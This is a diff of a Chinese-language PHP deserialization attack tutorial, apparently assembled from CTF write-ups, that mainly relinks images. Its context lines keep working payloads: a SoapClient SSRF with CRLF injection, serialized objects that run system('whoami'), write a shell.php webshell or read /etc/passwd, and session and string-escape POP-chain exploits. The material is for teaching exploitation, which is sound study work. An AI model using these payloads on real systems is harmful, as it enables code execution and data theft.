 我们显而易见是要构造soapclient类去SSRF,然后利用flag中的函数构造原生类去读取文件
 
@@ -2671,7 +2671,7 @@ call_user_func(array(reset($_SESSION), $this->a))
 
 所以我们稍微修改下pop链条就可以触发ssrf
 
-[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669574331967-d04a8061-386d-4121-852e-17431ba2c643.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669574331967-d04a8061-386d-4121-852e-17431ba2c643.png)
+[![img](../../../_assets/images/b999c42e798187ae0ad8cb15eb849ddb77609025b348f1b171c2acb9e52adbf4.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669574331967-d04a8061-386d-4121-852e-17431ba2c643.png)
 
 ```
 O:1:"B":3:{s:1:"a";O:1:"C":2:{s:1:"a";s:6:"sakura";s:1:"c";O:1:"A":2:{s:1:"a";s:11:"0e215962017";s:1:"b";r:2;}}s:1:"b";N;s:1:"k";N;
@@ -2699,7 +2699,7 @@ Upgrade-Insecure-Requests: 1
 sess=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A62%3A%22http%3A%2F%2F127.0.0.1%3A80%2Fflag.php%3Fa%3DDirectoryIterator%26b%3Dglob%3A%2F%2F%2F%2Af%2A%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A157%3A%22wupco%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+PHPSESSID%3Dkod01dgtpdrd999ms9vqa8l5hl%0D%0AContent-Length%3A+6%0D%0A%0D%0AHY%3D666%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
 ```
 
-[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669574440522-428f74a1-d1f1-4232-beb7-51070680d9f1.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669574440522-428f74a1-d1f1-4232-beb7-51070680d9f1.png)
+[![img](../../../_assets/images/a8c42fd6f069709b22f38c4b48ab061dd55c03109f98e59f6c6b8ef5a79c204a.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669574440522-428f74a1-d1f1-4232-beb7-51070680d9f1.png)
 
 2.调用pop链进行SSRF
 
@@ -2721,7 +2721,7 @@ Upgrade-Insecure-Requests: 1
 pop=O%3A1%3A%22B%22%3A3%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22C%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A6%3A%22phpinf%22%3Bs%3A1%3A%22c%22%3BO%3A1%3A%22A%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A11%3A%220e215962017%22%3Bs%3A1%3A%22b%22%3Br%3A2%3B%7D%7Ds%3A1%3A%22b%22%3BN%3Bs%3A1%3A%22k%22%3BN%3B
 ```
 
-[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669574489346-916347ef-296e-406f-9900-d79d5a42f78d.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669574489346-916347ef-296e-406f-9900-d79d5a42f78d.png)
+[![img](../../../_assets/images/5b43d883ffa01610c23f1307a1fee998b77882b55efa2fe607864c177dd5c032.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669574489346-916347ef-296e-406f-9900-d79d5a42f78d.png)
 
 我们成功找到了根目录下flag文件的名称,接下来同理，构造原生类读取文件即可
 
@@ -2751,7 +2751,7 @@ sess=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%
 
 3.访问主页面，记得不要再传参了，session会被覆盖
 
-[![img](https://sakurahack-y.github.io/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669574785928-ec75acf4-bc07-40e5-b354-204c3470effd.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669574785928-ec75acf4-bc07-40e5-b354-204c3470effd.png)
+[![img](../../../_assets/images/e6420e5c5c61be01b0ed231ae125337143f46c20b458cd848aa3c75a6f892f77.png)](https://sakurahack-y.github.io/2022/12/08/php反序列化总结/1669574785928-ec75acf4-bc07-40e5-b354-204c3470effd.png)
 
 # 一、基础
 
@@ -4287,7 +4287,7 @@ $obj->run();
 ?>
 ```
 
-[![alt text](https://image.3001.net/images/20240325/1711368443_660168fb5f2854628a93f.png)](https://image.3001.net/images/20240325/1711368443_660168fb5f2854628a93f.png)
+[![alt text](../../../_assets/images/557541a1f7875f7edd07be9177f0460610043b35b8b079cb3fc5211e3256c535.png)](https://image.3001.net/images/20240325/1711368443_660168fb5f2854628a93f.png)
 
 可以看到，子类 `SubClass` 并没有定义 `money` 属性和 `run` 方法，但是可以调用其属性和方法，这就是继承。
 
@@ -4735,7 +4735,7 @@ echo serialize($obj);
 
 序列化值解读:
 
-[![alt text](https://image.3001.net/images/20240325/1711368453_66016905ddeff25377d8d.png)](https://image.3001.net/images/20240325/1711368453_66016905ddeff25377d8d.png)
+[![alt text](../../../_assets/images/402cd61c1d2991aea37197b662bfe0f0aa7def488db799886fe0907d9587ced1.png)](https://image.3001.net/images/20240325/1711368453_66016905ddeff25377d8d.png)
 
 ```
 php
@@ -4873,7 +4873,7 @@ echo serialize(new Demo);
 
 **序列化值如下:**
 
-[![alt text](https://image.3001.net/images/20240325/1711368461_6601690daf6febc635986.png)](https://image.3001.net/images/20240325/1711368461_6601690daf6febc635986.png)
+[![alt text](../../../_assets/images/3958d2bd426f7fb79efe9150a89bf72524d64d2c1b0d972d0ecee79e6379a678.png)](https://image.3001.net/images/20240325/1711368461_6601690daf6febc635986.png)
 
 - `public` : 访问权限为 `public` 的属性，在序列化之后的字符串中，表示属性名的，与实际类中的一致。
 - `protected` : 访问权限为 `protected` 的属性，在序列化之后的字符串中，表示属性名的，会在其实际类中的名前面加上 `\x00*\x00`, 例如 `protected $name` 序列化之后，就为 `\x00*\x00name`
@@ -4896,7 +4896,7 @@ $obj = unserialize('O:4:"Demo":1:{s:4:"name";s:5:"x1ong";}');
 echo $obj->name;  // x1ong 
 ```
 
-[![alt text](https://image.3001.net/images/20240325/1711368466_66016912177394ec94b54.png)](https://image.3001.net/images/20240325/1711368466_66016912177394ec94b54.png)
+[![alt text](../../../_assets/images/25ee4735d1c8147b5a02c6e62318c92c24887e73fba9cfe7f4aa7915ae55ea83.png)](https://image.3001.net/images/20240325/1711368466_66016912177394ec94b54.png)
 
 1. `unserialize` 反序列化成功之后返回的是对象。
 2. **反序列化生成的对象里面的属性和值，由反序列化里的属性和值提供，与原有类预定义的属性和值无关**。
@@ -4994,7 +4994,7 @@ echo serialize($obj);
 
 执行得到序列化之后的值:
 
-[![alt text](https://image.3001.net/images/20240325/1711368474_6601691a28120ba215716.png)](https://image.3001.net/images/20240325/1711368474_6601691a28120ba215716.png)
+[![alt text](../../../_assets/images/4d9f4f2269fec7f9c2541fd9889dfefd1bec70bcf310c81ed0c540697c26232a.png)](https://image.3001.net/images/20240325/1711368474_6601691a28120ba215716.png)
 
 传参:
 
@@ -5003,7 +5003,7 @@ php
 ?word=O:7:"Execute":1:{s:3:"cmd";s:17:"system('whoami');";}
 ```
 
-[![alt text](https://image.3001.net/images/20240325/1711368477_6601691db04ac66538db5.png)](https://image.3001.net/images/20240325/1711368477_6601691db04ac66538db5.png)
+[![alt text](../../../_assets/images/901da63209b57f668203d461fb9a075df9e218b7015eeca10ca1741c411e65e7.png)](https://image.3001.net/images/20240325/1711368477_6601691db04ac66538db5.png)
 
 ### 怎样利用反序列化
 
@@ -5067,7 +5067,7 @@ O:3:"vul":1:{s:3:"cmd";s:6:"whoami";}
 
 利用:
 
-[![alt text](https://image.3001.net/images/20240325/1711368483_660169232ae1faa9af15e.png)](https://image.3001.net/images/20240325/1711368483_660169232ae1faa9af15e.png)
+[![alt text](../../../_assets/images/e6283204e0fb76b0b3d9ffaba96e85c0dc7ccb5c01fc3352058de623273ec5ce.png)](https://image.3001.net/images/20240325/1711368483_660169232ae1faa9af15e.png)
 
 #### 例题 - 2
 
@@ -5129,7 +5129,7 @@ O:3:"vul":2:{s:8:"filename";s:9:"shell.php";s:7:"content";s:36:"<?php echo 123;e
 
 利用:
 
-[![alt text](https://image.3001.net/images/20240325/1711368487_660169279562f03402663.png)](https://image.3001.net/images/20240325/1711368487_660169279562f03402663.png)
+[![alt text](../../../_assets/images/9abb18e6f12b43d63fd7d177418508c202697b91879740767c9f98ae8ed819a2.png)](https://image.3001.net/images/20240325/1711368487_660169279562f03402663.png)
 
 利用之后，会在同目录下生成 `shell.php` 文件，访问利用即可。
 
@@ -5190,7 +5190,7 @@ O:3:"vul":1:{s:4:"file";s:11:"/etc/passwd";}
 
 利用:
 
-[![alt text](https://image.3001.net/images/20240325/1711368492_6601692c5bf5ffd888fc8.png)](https://image.3001.net/images/20240325/1711368492_6601692c5bf5ffd888fc8.png)
+[![alt text](../../../_assets/images/6e41590db038f6562053d5fadb9a473c572331241c8fe6fb83b8e5367948d20d.png)](https://image.3001.net/images/20240325/1711368492_6601692c5bf5ffd888fc8.png)
 
 #### 例题 - 4
 
@@ -5276,7 +5276,7 @@ O:4:"vul1":1:{s:3:"obj";O:4:"vul3":1:{s:3:"cmd";s:6:"whoami";}}
 
 利用:
 
-[![alt text](https://image.3001.net/images/20240325/1711368497_660169313efe7fd7195de.png)](https://image.3001.net/images/20240325/1711368497_660169313efe7fd7195de.png)
+[![alt text](../../../_assets/images/402ee48010d879edde4be0f0aed7f09042b7bd76283b61267e8653703e872ccd.png)](https://image.3001.net/images/20240325/1711368497_660169313efe7fd7195de.png)
 
 #### 例题 - 5
 
@@ -5321,7 +5321,7 @@ O%3A3%3A%22vul%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00cmd%22%3Bs%3A6%3A%22whoami%22%3B%
 
 执行:
 
-[![alt text](https://image.3001.net/images/20240325/1711368505_66016939069ddd75bab32.png)](https://image.3001.net/images/20240325/1711368505_66016939069ddd75bab32.png)
+[![alt text](../../../_assets/images/0c29d57fd680a8d4602a0554d163da03e0ab75452063a7922f6d17055cc7a2d8.png)](https://image.3001.net/images/20240325/1711368505_66016939069ddd75bab32.png)
 
 #### 例题 - 6
 
@@ -5368,7 +5368,7 @@ O%3A3%3A%22vul%22%3A1%3A%7Bs%3A8%3A%22%00vul%00cmd%22%3Bs%3A6%3A%22whoami%22%3B%
 
 利用:
 
-[![alt text](https://image.3001.net/images/20240325/1711368510_6601693e7e685f2026616.png)](https://image.3001.net/images/20240325/1711368510_6601693e7e685f2026616.png)
+[![alt text](../../../_assets/images/b1f1be22c27b08b52565f0a4c8839713212bb3182cd9c2dad104ed88af672aff.png)](https://image.3001.net/images/20240325/1711368510_6601693e7e685f2026616.png)
 
 ### session 反序列化
 
@@ -5376,7 +5376,7 @@ O%3A3%3A%22vul%22%3A1%3A%7Bs%3A8%3A%22%00vul%00cmd%22%3Bs%3A6%3A%22whoami%22%3B%
 
 PHP 在 session 读取和存储的时候，都会有一个序列化和反序列化的过程，PHP 内置了多种处理器存取 `$_SESSION` 数据，都会对数据进行序列化和反序列化。
 
-[![alt text](https://image.3001.net/images/20240325/1711368514_66016942e37559f2b822b.png)](https://image.3001.net/images/20240325/1711368514_66016942e37559f2b822b.png)
+[![alt text](../../../_assets/images/155e4afc857fb8bb628da7e71f23eb71cbb4cc7cb16f7c95132e85a8785ddcb9.png)](https://image.3001.net/images/20240325/1711368514_66016942e37559f2b822b.png)
 
 #### 序列化引擎
 
@@ -5398,21 +5398,21 @@ $_SESSION['name'] = 'x1ong';
 
 **php_binary:**
 
-[![alt text](https://image.3001.net/images/20240325/1711368519_66016947f3f1ee82f0253.png)](https://image.3001.net/images/20240325/1711368519_66016947f3f1ee82f0253.png)
+[![alt text](../../../_assets/images/1c1de52d4ce991d987208a1738b1587bb83ebf5771a989a56fcee64f879fcead.png)](https://image.3001.net/images/20240325/1711368519_66016947f3f1ee82f0253.png)
 
 **php**
 
-[![alt text](https://image.3001.net/images/20240325/1711368523_6601694b9f25aac96b5a9.png)](https://image.3001.net/images/20240325/1711368523_6601694b9f25aac96b5a9.png)
+[![alt text](../../../_assets/images/1c5cd4a08abb6370e0708703b3681d60403956a99495e4b67af983212fc0322d.png)](https://image.3001.net/images/20240325/1711368523_6601694b9f25aac96b5a9.png)
 
 **php_serialize**
 
-[![alt text](https://image.3001.net/images/20240325/1711368525_6601694daca4e8f1abaa8.png)](https://image.3001.net/images/20240325/1711368525_6601694daca4e8f1abaa8.png)
+[![alt text](../../../_assets/images/1ee391acc61a725d65669d5e93b0135d7560cb86f176d8dcc21e199064673bd2.png)](https://image.3001.net/images/20240325/1711368525_6601694daca4e8f1abaa8.png)
 
 三种处理器的存储格式差异，就会造成 session 序列化和反序列化处理器设置不当时的安全隐患。
 
 #### Session 上传进度
 
-[![alt text](https://image.3001.net/images/20240325/1711368530_660169527e71a525c3ff3.png)](https://image.3001.net/images/20240325/1711368530_660169527e71a525c3ff3.png)
+[![alt text](../../../_assets/images/61bfc5ad83cb81301dbd441e4d11a8d3cd062607a2d41acbcad70d3db0c65a5a.png)](https://image.3001.net/images/20240325/1711368530_660169527e71a525c3ff3.png)
 
 ```
 html
@@ -5431,7 +5431,7 @@ html
 
 此时我们来到 session_xxxx 文件中就可以看到序列化之后的上传进度，并在其中可以看到上传的文件名和 `PHP_SESSION_UPLOAD_PROGRESS` 相应的值:
 
-[![alt text](https://image.3001.net/images/20240325/1711368534_66016956ca50df3895c81.png)](https://image.3001.net/images/20240325/1711368534_66016956ca50df3895c81.png)
+[![alt text](../../../_assets/images/a0e0da728dd23c23f3539d26c97a745786a5f205c17127bb2111bd5e53d89dbb.png)](https://image.3001.net/images/20240325/1711368534_66016956ca50df3895c81.png)
 
 #### Session 反序列化题目
 
@@ -5465,7 +5465,7 @@ else {
 
 通过为 `phpinfo` 参数传入值可执行 `phpinfo()` 函数查看其信息。
 
-[![alt text](https://image.3001.net/images/20240325/1711368539_6601695b08380611005ed.png)](https://image.3001.net/images/20240325/1711368539_6601695b08380611005ed.png)
+[![alt text](../../../_assets/images/ac45f4a6b5d99d5d6400e184a592d949b673ffd48b8d68c40ffd0e22e63c7bc6.png)](https://image.3001.net/images/20240325/1711368539_6601695b08380611005ed.png)
 
 发现当前页面使用的反序列化引擎为 `php`，而 `php.ini` 配置文件中配置的是 `php_serialize`，这个差异就导致了 `session` 反序列化问题。
 
@@ -5501,9 +5501,9 @@ O:5:"OowoO":1:{s:4:"mdzz";s:17:"system('whoami');";}
 |O:5:\"OowoO\":1:{s:4:\"mdzz\";s:17:\"system('whoami');\";}
 ```
 
-[![alt text](https://image.3001.net/images/20240325/1711368543_6601695fab7f1457be5b0.png)](https://image.3001.net/images/20240325/1711368543_6601695fab7f1457be5b0.png)
+[![alt text](../../../_assets/images/046d39965b2d51a6d004d927d43f4f3ee7001e7a466ca42281759bbda0a6bfd2.png)](https://image.3001.net/images/20240325/1711368543_6601695fab7f1457be5b0.png)
 
-[![alt text](https://image.3001.net/images/20240325/1711368547_6601696375d90c15d49e9.png)](https://image.3001.net/images/20240325/1711368547_6601696375d90c15d49e9.png)
+[![alt text](../../../_assets/images/9f063484405cd5c2a3e0d5162c372633bb37b738bc2e901f7c75547e3c97b3c2.png)](https://image.3001.net/images/20240325/1711368547_6601696375d90c15d49e9.png)
 成功执行命令。
 
 ### POP 链
@@ -5625,7 +5625,7 @@ echo urlencode(serialize($obj3));
 
 利用:
 
-[![alt text](https://image.3001.net/images/20240325/1711368553_660169690c626ded4134b.png)](https://image.3001.net/images/20240325/1711368553_660169690c626ded4134b.png)
+[![alt text](../../../_assets/images/16745c417f865e2a46b8261dcb0b56369ac268830910c3dbc6010064bf89d578.png)](https://image.3001.net/images/20240325/1711368553_660169690c626ded4134b.png)
 
 #### 例题 2
 
@@ -5737,7 +5737,7 @@ echo urlencode(serialize($obj2));
 
 利用:
 
-[![alt text](https://image.3001.net/images/20240325/1711368560_660169703a4304c3ef166.png)](https://image.3001.net/images/20240325/1711368560_660169703a4304c3ef166.png)
+[![alt text](../../../_assets/images/71686fca355f52fcdae3e448c38ebdcc07fb2adcafc3d649f56d598fa772d9d5.png)](https://image.3001.net/images/20240325/1711368560_660169703a4304c3ef166.png)
 
 ##### 题解
 
@@ -5769,13 +5769,13 @@ echo urlencode(serialize($obj2));
 
 利用:
 
-[![alt text](https://image.3001.net/images/20240325/1711368565_66016975061939cd9dd95.png)](https://image.3001.net/images/20240325/1711368565_66016975061939cd9dd95.png)
+[![alt text](../../../_assets/images/8cce9693e40058718b3ee6f081526f07615956b58a5af53e731c3213b29b77a3.png)](https://image.3001.net/images/20240325/1711368565_66016975061939cd9dd95.png)
 
-[![alt text](https://image.3001.net/images/20240325/1711368567_660169772f9f9200e5786.png)](https://image.3001.net/images/20240325/1711368567_660169772f9f9200e5786.png)
+[![alt text](../../../_assets/images/988d6aafc19669235694da4aab1832fac36eb7792547421aa6d8419c4ffcb959.png)](https://image.3001.net/images/20240325/1711368567_660169772f9f9200e5786.png)
 
 至于为什么调用了 `_show` 方法之后执行了两次 `__toString()`，而 `Change` 执行了一次 `__toString()` 原因如下:
 
-[![alt text](https://image.3001.net/images/20240325/1711368570_6601697a677f1255915d7.png)](https://image.3001.net/images/20240325/1711368570_6601697a677f1255915d7.png)
+[![alt text](../../../_assets/images/8f2f1ebec0c2dfc84a3513188e221216a2ff603d6ccf248f643f6e7602e9e49f.png)](https://image.3001.net/images/20240325/1711368570_6601697a677f1255915d7.png)
 
 #### 例题 - 3
 
@@ -5931,7 +5931,7 @@ $arr();
 ?>
 ```
 
-[![alt text](https://image.3001.net/images/20240325/1711368578_6601698250d8405a0bd17.png)](https://image.3001.net/images/20240325/1711368578_6601698250d8405a0bd17.png)
+[![alt text](../../../_assets/images/9cc5b96e3bffb8b74285ed372e7cfefec1f0622f2757941d62117fce59433369.png)](https://image.3001.net/images/20240325/1711368578_6601698250d8405a0bd17.png)
 
 **分析:**
 
@@ -5964,7 +5964,7 @@ echo serialize($f);
 
 利用:
 
-[![alt text](https://image.3001.net/images/20240325/1711368582_660169869038f1e028c2d.png)](https://image.3001.net/images/20240325/1711368582_660169869038f1e028c2d.png)
+[![alt text](../../../_assets/images/333e5398e00c7a9a4dd1c7c05698b9631e18a3b38476f82d9d9e60a9d8cffb20.png)](https://image.3001.net/images/20240325/1711368582_660169869038f1e028c2d.png)
 
 ### 字符逃逸
 
@@ -6092,7 +6092,7 @@ echo serialize($obj1);
 
 1. 将 A 对象的 `username` 或 `password` 属性赋值为反序列化 B 类
 
-[![alt text](https://image.3001.net/images/20240325/1711368591_6601698f28c6feb5dba5e.png)](https://image.3001.net/images/20240325/1711368591_6601698f28c6feb5dba5e.png)
+[![alt text](../../../_assets/images/ca2a998bcf214cbafc116f87e6454415ca4e0bdef2a87daa4a04167b8ae85ae6.png)](https://image.3001.net/images/20240325/1711368591_6601698f28c6feb5dba5e.png)
 
 其中标注红的则是注入对象的值，但是由于是字符串传入，因此会把该序列化值当作普通字符串，很明显是利用不成功的。
 
@@ -6102,7 +6102,7 @@ echo serialize($obj1);
 
 我们在 username 处传入 `\0\0\0` 当经过 `read()` 函数之后则会变成：
 
-[![alt text](https://image.3001.net/images/20240325/1711368596_66016994051db46a73390.png)](https://image.3001.net/images/20240325/1711368596_66016994051db46a73390.png)
+[![alt text](../../../_assets/images/24ca2ad068d34a82adbd2265007f792d0f81c0934d7f24bbc6512b5df27591a6.png)](https://image.3001.net/images/20240325/1711368596_66016994051db46a73390.png)
 
 经过 `read()` 长到短之后，就带入到 `unserialize()` 函数进行反序列化，由于原本值长度为 6 位，但是替换之后实际长度变成了 3 位，那么 PHP 则会向后再取 3 位。最终由于语法格式不对，导致反序列化错误。
 
@@ -6110,33 +6110,33 @@ echo serialize($obj1);
 
 首先我们先计算要吃掉的字符串长度:
 
-[![alt text](https://image.3001.net/images/20240325/1711368600_6601699881eb4e23f2d80.png)](https://image.3001.net/images/20240325/1711368600_6601699881eb4e23f2d80.png)
+[![alt text](../../../_assets/images/ad655bf1d977adf9aa61d5b09a281a3305e1f1a395587d01b55d6e886eff3e63.png)](https://image.3001.net/images/20240325/1711368600_6601699881eb4e23f2d80.png)
 
 由于序列化字符串的格式都是 `属性;值;属性;值`，而我们将其吃掉之后，就变成了 `属性;值;值;`, 不符合要求，故而我们添加一个属性名，假设为 `password`:
 
-[![alt text](https://image.3001.net/images/20240325/1711368605_6601699dc17938d1f18c6.png)](https://image.3001.net/images/20240325/1711368605_6601699dc17938d1f18c6.png)
+[![alt text](../../../_assets/images/b175ac6a62c4c397a4ee3e7463fcf1d09eb9acdba86524f55de2baf77ac2205f.png)](https://image.3001.net/images/20240325/1711368605_6601699dc17938d1f18c6.png)
 
 但是上图中红色文字末尾的需要进行闭合，我们添加闭合内容：
 
-[![alt text](https://image.3001.net/images/20240325/1711368608_660169a0a95ff40eb0766.png)](https://image.3001.net/images/20240325/1711368608_660169a0a95ff40eb0766.png)
+[![alt text](../../../_assets/images/4f9644c45bd5b998a9eda1f0cd88909194e2c88a051d427847d7c10b0240de1b.png)](https://image.3001.net/images/20240325/1711368608_660169a0a95ff40eb0766.png)
 
 接下来就符合要求了，那么 `$_GET[b]` 传入的值就为:
 
-[![alt text](https://image.3001.net/images/20240325/1711368612_660169a46fb85f0591588.png)](https://image.3001.net/images/20240325/1711368612_660169a46fb85f0591588.png)
+[![alt text](../../../_assets/images/12ca8a765cc93050b83041d54cf9c2ad3d32d2ea265ccaf9b4ebcbf2cf835942.png)](https://image.3001.net/images/20240325/1711368612_660169a46fb85f0591588.png)
 
 最后我们只需要计算需要多个对 `\0\0\0` 替换即可，前面计算出来我们需要吃掉 22 个字符。
 
-[![alt text](https://image.3001.net/images/20240325/1711368616_660169a8ba141228e2db2.png)](https://image.3001.net/images/20240325/1711368616_660169a8ba141228e2db2.png)
+[![alt text](../../../_assets/images/07e45214be810b0491642b4d652d0f82358a5e365687410954dfb3d31ec18f1a.png)](https://image.3001.net/images/20240325/1711368616_660169a8ba141228e2db2.png)
 
 而每对 6 位字符 `\0\0\0` 替换为 `3个字符`，也就是 `22 / 3 `是除不尽的。
 
-[![alt text](https://image.3001.net/images/20240325/1711368620_660169aca9e833cd74fbc.png)](https://image.3001.net/images/20240325/1711368620_660169aca9e833cd74fbc.png)
+[![alt text](../../../_assets/images/956f9c95f7905660d802ab8a5b700aac0b025bb1a1b0fefb73fd3ef2a1aadb81.png)](https://image.3001.net/images/20240325/1711368620_660169aca9e833cd74fbc.png)
 
 那么该怎么办呢？其实很简单，在 `password` 前面加入两个字符，让吃掉的字符变为 **24** 即可，让其除的进，**这里特别注意，不能在 `username` 处加入，因为这会影响值的长度**。
 
 于是 password ，也就是 `$_GET[b]` 的值为:
 
-[![alt text](https://image.3001.net/images/20240325/1711368624_660169b09986523f05cb2.png)](https://image.3001.net/images/20240325/1711368624_660169b09986523f05cb2.png)
+[![alt text](../../../_assets/images/6f8da466b76ede3e69732bfb42afb8c5e6a4d404ba91e0dbd718c6d650ad1748.png)](https://image.3001.net/images/20240325/1711368624_660169b09986523f05cb2.png)
 
 最终 22 / 3 得 8，于是 `username` 处只需要 8 对 `\0\0\0` 即可。
 
@@ -6145,7 +6145,7 @@ php
 ?a=UA\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&b=x";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}s:0:"";s:0:"
 ```
 
-[![alt text](https://image.3001.net/images/20240325/1711368629_660169b5a0d6b457e40eb.png)](https://image.3001.net/images/20240325/1711368629_660169b5a0d6b457e40eb.png)
+[![alt text](../../../_assets/images/631b67011bf54a8e68effdea8d121dc51c4cf1a92a91c9c8f7e2a8e2af6c1a75.png)](https://image.3001.net/images/20240325/1711368629_660169b5a0d6b457e40eb.png)
 
 #### 例题 - 2 短到长
 
@@ -6201,31 +6201,31 @@ $b = unserialize(write(read(serialize($a))));
 1. 序列化入口类
    与长到短一致，这里只放截图:
 
-[![alt text](https://image.3001.net/images/20240325/1711368635_660169bbb47c47117628b.png)](https://image.3001.net/images/20240325/1711368635_660169bbb47c47117628b.png)
+[![alt text](../../../_assets/images/167a3d6cf86ba7de91ee4bc816d7df6c52ecfe39f37cdbafcef6f3a41f6d061b.png)](https://image.3001.net/images/20240325/1711368635_660169bbb47c47117628b.png)
 
 1. 构造 POP 链 序列化注入对象
    与长到短一致，这里只放截图:
 
-[![alt text](https://image.3001.net/images/20240325/1711368640_660169c0db1d25fbd2a22.png)](https://image.3001.net/images/20240325/1711368640_660169c0db1d25fbd2a22.png)
+[![alt text](../../../_assets/images/0baac65752f311e39c10c314e36e9c5a7eb28755ddcacbe087ed93d27c223edd.png)](https://image.3001.net/images/20240325/1711368640_660169c0db1d25fbd2a22.png)
 
 1. 将 A 对象的 `username` 或 `password` 属性赋值为反序列化 B 类
 
-[![alt text](https://image.3001.net/images/20240325/1711368644_660169c40386689979124.png)](https://image.3001.net/images/20240325/1711368644_660169c40386689979124.png)
+[![alt text](../../../_assets/images/c0c77e24ad8db7db709f61f403bf3a6155958c80bffa5f32a251bc37550c3141.png)](https://image.3001.net/images/20240325/1711368644_660169c40386689979124.png)
 
 1. 构造闭合
    由于不符合序列化字符串的规范，故而我们需要构造闭合:
 
-[![alt text](https://image.3001.net/images/20240325/1711368649_660169c996da8278380f4.png)](https://image.3001.net/images/20240325/1711368649_660169c996da8278380f4.png)
+[![alt text](../../../_assets/images/63603d729efd398239fef0b34a442551d040e61ca772214f35b2aff326e53e92.png)](https://image.3001.net/images/20240325/1711368649_660169c996da8278380f4.png)
 
 1. 计算要挤出的长度
 
-[![alt text](https://image.3001.net/images/20240325/1711368653_660169cd8b653a4b93ac2.png)](https://image.3001.net/images/20240325/1711368653_660169cd8b653a4b93ac2.png)
+[![alt text](../../../_assets/images/da0f37c13f88962ed5a399fa3ba1cb587bd8ce0c7692c8d57c1afc9dd1f77399.png)](https://image.3001.net/images/20240325/1711368653_660169cd8b653a4b93ac2.png)
 
 由于 `write` 函数每替换一次，都会增加 3 个字节，所以逃逸数据必须是 3 的倍数，上面挤出的长度为 78，是 3 的倍数，可以不用动，如果不是 3 的倍数，则可以修改 `属性名` 的方法，使其成为 3 的倍数，例如下图尖头所指位置:
 
-[![alt text](https://image.3001.net/images/20240325/1711368661_660169d530525660d7ade.png)](https://image.3001.net/images/20240325/1711368661_660169d530525660d7ade.png)
+[![alt text](../../../_assets/images/2ea7b11b83b00577f57102aa7eca8f179125bf7d30a925f0db19e36dcb66be2b.png)](https://image.3001.net/images/20240325/1711368661_660169d530525660d7ade.png)
 
-[![alt text](https://image.3001.net/images/20240325/1711368656_660169d0c31323dc11d24.png)](https://image.3001.net/images/20240325/1711368656_660169d0c31323dc11d24.png)
+[![alt text](../../../_assets/images/bb877a4f92f7e0b3fa2978e54a984c9a68cb9cbd3b814418d2cb0d4b8e8678fe.png)](https://image.3001.net/images/20240325/1711368656_660169d0c31323dc11d24.png)
 
 最后只需要 26 对 `0*0`（0 为不可见字符）即可，本地测试代码:
 
@@ -6252,7 +6252,7 @@ echo write(serialize($a));
 
 运行结果如下：
 
-[![alt text](https://image.3001.net/images/20240325/1711368666_660169da7e00b89921993.png)](https://image.3001.net/images/20240325/1711368666_660169da7e00b89921993.png)
+[![alt text](../../../_assets/images/6a2bb224db5fb14dde951d136cbd0ff3291f4657e374267fbf89adffe5fe06ac.png)](https://image.3001.net/images/20240325/1711368666_660169da7e00b89921993.png)
 
 此时 `xx` 属性就被挤出来了，其值为 `B` 类生成的对象。
 
@@ -6263,7 +6263,7 @@ php
 ?a=%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%22;s:2:%22xx%22;O:1:%22B%22:1:{s:1:%22b%22;O:1:%22C%22:1:{s:1:%22c%22;s:8:%22flag.php%22;}}s:0:%22%22;s:0:%22&b=x1ong
 ```
 
-[![alt text](https://image.3001.net/images/20240325/1711368671_660169df441e115d563ea.png)](https://image.3001.net/images/20240325/1711368671_660169df441e115d563ea.png)
+[![alt text](../../../_assets/images/2bb0d57f4fee3c9c68fa66bbb319f77425b4d886be0dedec64ead554f968e81f.png)](https://image.3001.net/images/20240325/1711368671_660169df441e115d563ea.png)
 
 ### Phar
 
@@ -6283,7 +6283,7 @@ php
 
 #### Phar 文件格式
 
-[![alt text](https://image.3001.net/images/20240325/1711368676_660169e43639939a3db9a.png)](https://image.3001.net/images/20240325/1711368676_660169e43639939a3db9a.png)
+[![alt text](../../../_assets/images/9b3826aa244602e1706334bce2a7b6f659dfc3f0a9be8994975551ca84ad8834.png)](https://image.3001.net/images/20240325/1711368676_660169e43639939a3db9a.png)
 
 可以从 `Phar` 文件格式中看到，其中用户自定义的 `Meta-data` 会以序列化的形式存储，那么使用 `Phar` 文件的时候一定会进行反序列化，至此在没有 `unserialize()` 函数的时候，同样达到了 `unserialize()` 函数的效果。
 
@@ -6297,7 +6297,7 @@ php
 
 需要修改 `php.ini` 配置文件，将 `phar.readonly = On` 设置为 `phar.readonly = Off` 即关闭。
 
